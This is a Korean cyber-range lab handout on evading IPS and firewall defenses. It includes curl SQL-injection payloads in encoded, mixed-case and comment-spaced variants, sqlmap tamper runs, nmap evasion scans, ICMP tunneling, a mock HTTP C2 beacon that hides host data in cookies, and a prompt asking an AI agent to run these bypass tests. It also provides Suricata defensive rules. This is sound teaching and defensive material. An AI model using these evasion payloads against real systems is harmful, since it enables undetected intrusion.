# Week 10: IPS·방화벽 우회 기법

## 학습 목표
- secu에 설치된 nftables 방화벽 규칙과 Suricata IPS 룰을 읽고 해석한다
- 인코딩·대소문자·단편화 기반 시그니처 우회를 실습한다
- ICMP·HTTP 터널링의 개념을 이해하고 기초 관찰을 수행한다
- nmap 타이밍·디코이·출발지 포트 조작으로 스캔 탐지 회피를 시도한다
- 각 우회 기법에 대한 방어 룰을 작성한다

## 실습 환경

| 호스트 | IP | 역할 |
|--------|-----|------|
| manager | 10.20.30.200 | 공격 수행 (nmap·curl·Bastion :8003) |
| secu | 10.20.30.1 | nftables + Suricata (우회 대상) |
| web | 10.20.30.80 | 공격 표적 (JuiceShop :3000) |
| siem | 10.20.30.100 | Wazuh (탐지 로그 확인) |

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:30 | nftables 규칙 분석 (Part 1) | 강의+실습 |
| 0:30-1:00 | Suricata 룰 문법 (Part 2) | 강의 |
| 1:00-1:10 | 휴식 | - |
| 1:10-1:50 | 인코딩·대소문자·단편화 우회 (Part 3) | 실습 |
| 1:50-2:30 | 터널링·nmap 회피 (Part 4) | 실습 |
| 2:30-2:40 | 휴식 | - |
| 2:40-3:10 | 방어 룰 작성 + Wazuh 확인 (Part 5) | 실습 |
| 3:10-3:30 | Bastion 자동화 (Part 6) | 실습 |
| 3:30-3:40 | 정리 + 과제 | 정리 |

---

# Part 1: nftables 방화벽 분석

## 1.1 nftables 개념

**이것은 무엇인가?** Linux 커널의 차세대 패킷 필터링 프레임워크. iptables를 대체. **table → chain → rule** 3단 구조.

- **table**: 룰 그룹의 최상위 컨테이너 (예: `inet filter`)
- **chain**: 패킷이 훅 지점에서 거쳐 가는 룰 순서 (input/forward/output)
- **rule**: 매칭 조건 + 동작 (`accept` / `drop` / `reject`)

## 1.2 secu의 nftables 확인

```bash
ssh ccc@10.20.30.1 "sudo nft list ruleset" | head -40
```

**예상 출력 (간략):**
```
table inet filter {
    chain input {
        type filter hook input priority 0; policy drop;
        ct state established,related accept
        iif lo accept
        tcp dport 22 accept
        ip protocol icmp accept
    }
    chain forward {
        type filter hook forward priority 0; policy drop;
        ct state established,related accept
        ...
    }
}
```

**읽는 법:**

| 표현 | 의미 |
|------|------|
| `policy drop` | 매칭 안 되면 기본 차단 |
| `ct state established,related accept` | 이미 열린 연결은 허용 (stateful) |
| `tcp dport 22 accept` | TCP 22(SSH) 허용 |
| `ip protocol icmp accept` | ping 허용 |

## 1.3 통계가 있는 룰 확인 (히트 수)

```bash
ssh ccc@10.20.30.1 "sudo nft list ruleset -a" | head -20
```

`-a`는 각 룰의 handle 번호와 counter를 보여준다. counter가 있으면 "몇 개 패킷이 이 룰에 매칭됐는지" 확인 가능 → 어느 룰이 실제로 쓰이는지 관찰.

**우회 관점에서 중요한 것:** forward chain이 10.20.30.0/24 → 10.20.30.0/24를 어떻게 처리하는지. 대부분 `established,related accept`만 있고 새 연결은 drop이라 web 서버로의 새 TCP 연결은 명시적으로 허용되어야 한다.

---

# Part 2: Suricata IPS 룰 문법

## 2.1 룰 기본 구조

```
action protocol src_ip src_port -> dst_ip dst_port (options;)
```

**예시:**
```
alert http any any -> $HOME_NET any (
    msg:"ET WEB_SPECIFIC_APPS SQL Injection UNION SELECT";
    flow:to_server,established;
    content:"UNION"; nocase;
    content:"SELECT"; nocase; distance:0; within:20;
    sid:2012887; rev:3;
)
```

**구성요소:**

| 요소 | 의미 |
|------|------|
| `alert` / `drop` | 탐지 후 동작 (alert=로그, drop=차단) |
| `http` | 프로토콜 (tcp/udp/http/tls/dns 등) |
| `any any -> $HOME_NET any` | 출발지 any → 내부 대역 any |
| `msg:""` | 사람이 읽는 설명 |
| `flow:to_server,established` | 클라이언트→서버 방향의 기존 연결 |
| `content:"UNION"; nocase` | 페이로드에 "UNION" 포함 (대소문자 무관) |
| `distance:0; within:20` | 앞 content 다음 0-20바이트 안에 다음 content |
| `sid:` | 룰 고유 ID (커스텀은 1,000,000+ 권장) |
| `rev:` | 룰 개정 번호 |

## 2.2 secu의 로드된 룰 확인

```bash
# 룰셋 파일 목록
ssh ccc@10.20.30.1 "sudo ls /etc/suricata/rules/" 2>/dev/null

# 로컬 커스텀 룰
ssh ccc@10.20.30.1 "sudo cat /etc/suricata/rules/local.rules" 2>/dev/null

# 설정에서 로드되는 룰 파일
ssh ccc@10.20.30.1 "sudo grep -E 'rule-files|rule-path' /etc/suricata/suricata.yaml" 2>/dev/null
```

---

# Part 3: 시그니처 우회 기법

## 3.1 URL 인코딩

**원리:** 서버는 URL 디코딩하지만, 일부 IPS는 디코딩 전에 매칭. Suricata는 `http_uri` 키워드로 디코딩 후 검사 → 단순 URL 인코딩은 우회 못 함.

```bash
# 원본
echo "== 원본 UNION SELECT =="
curl -s -o /dev/null -w "HTTP %{http_code}\n" "http://10.20.30.80:3000/rest/products/search?q=test'+UNION+SELECT+1--"

# URL 인코딩
echo "== URL 인코딩 =="
curl -s -o /dev/null -w "HTTP %{http_code}\n" "http://10.20.30.80:3000/rest/products/search?q=test%27%20UNION%20SELECT%201--"

# 이중 URL 인코딩 (서버가 1회만 디코딩할 때)
echo "== 이중 인코딩 =="
curl -s -o /dev/null -w "HTTP %{http_code}\n" "http://10.20.30.80:3000/rest/products/search?q=test%2527%2520UNION%2520SELECT%25201--"

# Suricata 탐지 여부 확인
ssh ccc@10.20.30.1 "sudo tail -5 /var/log/suricata/fast.log" 2>/dev/null
```

## 3.2 대소문자 혼합

```bash
# 표준
curl -s -o /dev/null -w "%{http_code}\n" "http://10.20.30.80:3000/rest/products/search?q=test'+UNION+SELECT+1--"

# 혼합
curl -s -o /dev/null -w "%{http_code}\n" "http://10.20.30.80:3000/rest/products/search?q=test'+uNiOn+SeLeCt+1--"
```

**결과 해석:** Suricata 룰에 `nocase`가 있으면 탐지됨. ET 룰셋은 대부분 `nocase` 적용 → 단순 대소문자 혼합은 우회 못 함.

## 3.3 공백 대체

SQL에서 `UNION SELECT`는 공백을 주석(`/**/`)이나 줄바꿈(`%0a`)으로 대체 가능.

```bash
# /**/ 로 공백 대체
curl -s -o /dev/null -w "%{http_code}\n" \
  "http://10.20.30.80:3000/rest/products/search?q=test'+UNION/**/SELECT+1--"

# %0a(줄바꿈)로 대체
curl -s -o /dev/null -w "%{http_code}\n" \
  "http://10.20.30.80:3000/rest/products/search?q=test'%0AUNION%0ASELECT%0A1--"
```

**결과 해석:** 룰이 `content:"UNION "; content:"SELECT"`로 공백을 명시하면 우회 가능. `distance:N; within:N`을 쓰면 거리 허용되어 방어됨.

## 3.4 sqlmap `--tamper`로 자동 우회

```bash
# 사용 가능한 tamper 목록
sqlmap --list-tampers 2>&1 | grep -oE "^[a-z0-9_]+" | head -10

# 공백 → /**/ 변환하여 스캔
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" \
  --batch --tamper=space2comment,between 2>&1 | tail -20
```

---

# Part 4: 터널링·스캔 회피

## 4.1 ICMP 데이터 영역 확인 (터널링 원리)

**이것은 무엇인가?** ICMP Echo Request의 데이터 영역은 원래 단순 패딩이지만 임의 데이터 가능. 방화벽이 ICMP를 허용하면 이 영역으로 데이터 유출 가능.

```bash
# 터미널 1: secu에서 ICMP 패킷 내용 관찰
ssh ccc@10.20.30.1 "sudo tcpdump -i any icmp -nn -c 10 -X" 2>/dev/null &

# 터미널 2 (manager): 큰 패턴 ping
ping -s 1400 -p deadbeef -c 3 10.20.30.80
```

**결과 해석:** tcpdump 출력에서 데이터 영역에 `deadbeef deadbeef...` 반복이 보임. 실제 ICMP 터널 도구(`ptunnel`, `iodine` 등)는 이 영역에 C2 명령 전송.

**탐지:** Suricata에서 ICMP 패킷 크기가 비정상이거나, 패턴이 반복되면 의심. `icmp-size` 룰 작성 가능.

## 4.2 HTTP C2 비콘 흉내

정상 HTTP 요청처럼 보이지만 헤더·파라미터에 인코딩된 데이터가 숨겨져 있는 경우.

```bash
# 시스템 정보를 Base64 인코딩하여 Cookie에 숨김
SYSINFO=$(hostname | base64)
echo "인코딩된 페이로드: $SYSINFO"

curl -s "http://10.20.30.80:3000/rest/products/search?q=test" \
  -H "Cookie: session=$SYSINFO" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  -o /dev/null -w "HTTP %{http_code}\n"

# secu에서 tcpdump로 이 패턴 관찰
ssh ccc@10.20.30.1 "sudo tcpdump -i any 'port 3000' -A -nn -c 20" 2>/dev/null | head -30
```

**탐지 관점:**
- 단일 요청은 일반 트래픽과 구분 불가
- **반복 패턴**(일정 간격, 일정 Cookie 길이) → 비콘 의심
- HTTPS에선 내용 검사 불가 → 통계적 접근(패킷 크기·간격 분석) 필요

## 4.3 nmap 스캔 회피

```bash
# 기본 스캔 (매우 시끄러움 — 쉽게 탐지)
sudo nmap -sS -p 22,80,3000 10.20.30.80

# T1 (느림) — 탐지 임계값 아래로 내림
sudo nmap -sS -T1 -p 22,80,3000 10.20.30.80

# -f 단편화 — IPS가 재조립 안 하면 우회
sudo nmap -sS -f -p 22,80,3000 10.20.30.80

# 디코이 — 여러 가짜 IP를 섞어 보냄
sudo nmap -D RND:5 -p 22,80,3000 10.20.30.80

# 출발지 포트 53 (DNS 응답처럼 보이게)
sudo nmap --source-port 53 -p 22,80,3000 10.20.30.80

# 각 스캔 후 Suricata 탐지 확인
ssh ccc@10.20.30.1 "sudo tail -10 /var/log/suricata/fast.log" 2>/dev/null | tail -5
```

**결과 해석:**
- `T1` + `--max-retries 1`이 가장 효과적
- `-f`는 현대 IPS(Suricata)는 재조립하므로 효과 제한적
- `-D`는 로그에 "여러 IP에서 스캔"으로 보이지만 트래픽 유형 자체는 탐지됨

---

# Part 5: 우회 기법 vs 방어 대응

## 5.1 방어 매트릭스

| 우회 기법 | 원리 | IPS 대응 |
|-----------|------|---------|
| URL 인코딩 | `%XX`로 변환 | HTTP 디코딩 후 검사 (`http_uri`) |
| 이중 인코딩 | 2번 인코딩 | 재귀 디코딩 |
| 대소문자 혼합 | `UnIoN` | `nocase` 키워드 |
| 공백 대체 | `/**/`, `%0a` | `distance`/`within` 거리 허용 |
| 패킷 단편화 | 조각 나누기 | 재조립 후 검사 (`stream-reassembly`) |
| 느린 스캔 | 임계값 아래 | 장기 통계 기반 탐지 |
| ICMP 터널 | 데이터 영역 악용 | `icmp-size`, 페이로드 엔트로피 |
| HTTP 터널 | 정상 위장 | 행위·통계 기반 |

## 5.2 방어 룰 작성 예시

`/etc/suricata/rules/local.rules`에 추가:

```
# ICMP 큰 패킷 탐지 (터널 의심)
alert icmp any any -> any any (msg:"Custom ICMP large payload"; itype:8; dsize:>800; sid:1000100; rev:1;)

# UNION SELECT 거리 허용
alert http any any -> $HOME_NET any (msg:"Custom SQLi UNION SELECT flexible"; flow:to_server; content:"UNION"; nocase; content:"SELECT"; nocase; distance:0; within:50; sid:1000101; rev:1;)
```

```bash
# 문법 검증
ssh ccc@10.20.30.1 "sudo suricata -T -c /etc/suricata/suricata.yaml" 2>&1 | tail -5

# reload
ssh ccc@10.20.30.1 "sudo systemctl reload suricata" 2>/dev/null
```

## 5.3 Wazuh에서 확인

```bash
ssh ccc@10.20.30.100 \
  "sudo grep -iE 'suricata|scan|sqli' /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -3"
```

**결과 해석:** Wazuh는 Suricata의 alert를 수집하여 자체 ID로 분류. Week 08+ SOC 과정에서 이 파이프라인을 깊이 다룸.

---

# Part 6: Bastion 자연어 우회 테스트

```bash
curl -s -X POST http://10.20.30.200:8003/ask \
  -H 'Content-Type: application/json' \
  -d '{
    "message": "JuiceShop(http://10.20.30.80:3000/rest/products/search?q=) 검색 파라미터에 다음 4가지 SQLi 페이로드를 각각 보내고 각 시도 후 secu(10.20.30.1) /var/log/suricata/fast.log에서 해당 요청이 탐지되었는지 확인해서 우회 성공 여부를 표로 정리해줘: (1) test UNION SELECT 1-- (2) test%27%20UNION%20SELECT%201-- (3) test uNiOn SeLeCt 1-- (4) test UNION/**/SELECT 1--"
  }' \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['answer'])"
```

---

## 과제 (다음 주까지)

### 과제 1: 방어 체계 분석 (30점)
1. secu의 nftables 룰셋 전체 분석 보고서 (정책·허용 포트·forward 규칙) — 15점
2. Suricata 설정에서 로드되는 룰 파일 목록 + 커스텀 룰 여부 — 15점

### 과제 2: 우회 실험 (40점)
각 기법마다 (페이로드 + HTTP 상태 + Suricata 탐지 여부) 기록
1. URL 인코딩 3단계 — 10점
2. 대소문자 혼합 + 공백 대체 — 10점
3. sqlmap `--tamper` 2종 이상 — 10점
4. nmap `-T1`, `-f`, `-D`, `--source-port` 비교 — 10점

### 과제 3: 방어 룰 작성 (30점)
1. ICMP 터널 의심 탐지 룰 1개 (`local.rules`) — 10점
2. UNION SELECT 유연 탐지 룰 1개 — 10점
3. 문법 검증 (`suricata -T`) 결과 캡처 + reload 확인 — 10점

---

## 다음 주 예고

**Week 11: 권한 상승**
- SUID/SGID 바이너리 악용
- sudo NOPASSWD 남용
- cron 경로 조작
- GTFOBins 활용

---

## 용어 해설 (이번 주 추가분)

| 용어 | 영문 | 설명 |
|------|------|------|
| **nftables** | - | Linux 커널 패킷 필터 (iptables 후계) |
| **table/chain/rule** | - | nftables 3단 구조 |
| **policy drop** | - | 매칭 안 되면 기본 차단 |
| **Suricata SID** | - | 룰 고유 식별자 (커스텀 1M+) |
| **nocase** | - | Suricata 대소문자 무시 키워드 |
| **distance/within** | - | content 간 거리 지정 |
| **tamper** | - | sqlmap의 페이로드 변형 스크립트 |
| **fragmentation** | - | 큰 패킷을 조각으로 나눔 |
| **Living off the Land** | - | 대상 시스템의 정상 도구로 공격 |

---

## 📂 실습 참조 파일 가이드

### Suricata (secu:10.20.30.1)

| 경로 | 역할 |
|------|------|
| `/etc/suricata/suricata.yaml` | 메인 설정 (HOME_NET, af-packet, rule-files) |
| `/etc/suricata/rules/local.rules` | 커스텀 룰 (이번 주 작성) |
| `/etc/suricata/rules/*.rules` | ET·SOC 룰셋 |
| `/var/log/suricata/fast.log` | 텍스트 alert 로그 |
| `/var/log/suricata/eve.json` | JSON 이벤트 |
| `/var/log/suricata/stats.log` | 성능 통계 |

**이번 주 사용 명령**

- `sudo nft list ruleset` — nftables 전체 보기
- `sudo nft list ruleset -a` — counter·handle 포함
- `sudo suricata -T -c ...yaml` — 문법 검증
- `sudo systemctl reload suricata` — 룰 reload
- `sudo tail /var/log/suricata/fast.log` — 최근 alert

### sqlmap — 이번 주 `--tamper` 중심

| Tamper | 변환 |
|--------|------|
| `space2comment` | 공백 → `/**/` |
| `between` | `>` / `<` → `BETWEEN ... AND ...` |
| `charencode` | 전체 URL 인코딩 |
| `randomcase` | 키워드 대소문자 혼합 |

### nmap — 이번 주 회피 옵션

| 옵션 | 용도 |
|------|------|
| `-T0..T5` | 타이밍 (T1 = 매우 느림, IPS 회피) |
| `-f` | IP 단편화 |
| `-D RND:5` | 디코이 IP 5개 |
| `--source-port 53` | 출발지 포트 조작 |
| `--max-retries 1` | 재시도 최소화 |

### Bastion API (이번 주)

| 메서드 | 경로 | 용도 |
|--------|------|------|
| POST | `/ask` | 우회 기법 자동 점검 지시 |
| GET | `/evidence?limit=N` | 기록 |

---

> **실습 환경 검증 완료** (2026-03-28): JuiceShop SQLi/XSS/IDOR, nmap, 경로탐색(%2500), sudo NOPASSWD, SSH키, crontab

---

## 실제 사례 (WitFoo Precinct 6)

> **출처**: [WitFoo Precinct 6 Cybersecurity Dataset](https://huggingface.co/datasets/witfoo/precinct6-cybersecurity) (Apache 2.0)
> **익명화**: RFC5737 TEST-NET / ORG-NNNN / HOST-NNNN 으로 sanitized

본 주차 (10주차) 학습 주제와 직접 연관된 *실제* incident:

### SMB 측면이동 — 동일 자격증명 5호스트

> **출처**: WitFoo Precinct 6 / `incident-2024-08-001` (anchor: `anc-eca1db9a5a31`) · sanitized
> **시점**: 2024-08-12 03:14 ~ 03:42 (28 분)

**관찰**: 10.20.30.50 (john.doe) → 10.20.30.{60,70,80,90,100} 에 SMB 인증 성공. 단일 자격증명 재사용 패턴.

**MITRE ATT&CK**: **T1021.002 (SMB/Windows Admin Shares)**, **T1078 (Valid Accounts)**

**IoC**:
  - `10.20.30.50`
  - `smb-share://win-fs01/admin$`

**학습 포인트**:
- 동일 계정의 *시간상 가까운* 다중 호스트 SMB 인증 = 측면이동 강한 신호
- 패스워드 재사용 / 서비스 계정 공유 / SSO 토큰 위조 가능성
- 탐지: Sysmon EID 4624 (logon type 3) + 시간 윈도우 5분 + 호스트 N≥3
- 방어: per-host local admin / network segmentation / Windows Defender Credential Guard


**본 강의와의 연결**: 위 사례는 강의의 핵심 개념이 어떻게 *실제 운영 환경*에서 일어나는지 보여준다. 학생은 이 패턴을 (1) 공격자 입장에서 재현 가능한가 (2) 방어자 입장에서 탐지 가능한가 (3) 자기 인프라에서 동일 신호가 있는지 검색 가능한가 — 3 관점에서 평가한다.

---

> 더 많은 사례 (총 5 anchor + 외부 표준 7 source) 는 KG (Knowledge Graph) 페이지에서 검색 가능.
> Cyber Range 실습 중 학습 포인트 박스 (📖) 에 동일 anchor 가 자동 노출된다.
